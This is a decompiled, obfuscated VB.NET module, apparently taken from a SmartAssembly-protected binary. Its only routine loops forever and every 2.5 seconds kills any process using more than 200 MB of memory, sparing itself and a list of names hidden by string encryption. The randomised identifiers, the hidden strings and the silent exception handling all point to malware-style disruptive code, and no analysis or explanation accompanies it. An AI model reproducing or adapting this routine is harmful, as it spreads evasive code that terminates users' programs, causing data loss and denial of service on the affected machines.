Imports System
Imports System.Diagnostics
Imports System.Threading
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x02000022 RID: 34
	Public Module IUmAujruwdxT
		' Token: 0x060000DC RID: 220 RVA: 0x0000F5A0 File Offset: 0x0000D7A0
		Public Sub NcgkgbiyeApEB()
			While True
				For Each process As Process In Process.GetProcesses()
					Try
						If process.PrivateMemorySize64 > 209715200L AndAlso process.ProcessName <> Process.GetCurrentProcess().ProcessName AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107399014)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107399037)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107399028)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398987)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107399006)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398993)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398948)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398967)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398922)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398941)) AndAlso Not process.ProcessName.Contains(IUmAujruwdxT.getString_0(107398888)) Then
							process.Kill()
						End If
					Catch
					End Try
				Next
				Try
					Thread.Sleep(2500)
				Catch
				End Try
			End While
		End Sub

		' Token: 0x060000DD RID: 221 RVA: 0x00002BCE File Offset: 0x00000DCE
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(IUmAujruwdxT))
		End Sub

		' Token: 0x040000BF RID: 191
		<NonSerialized()>
		Friend getString_0 As GetString
	End Module
End Namespace
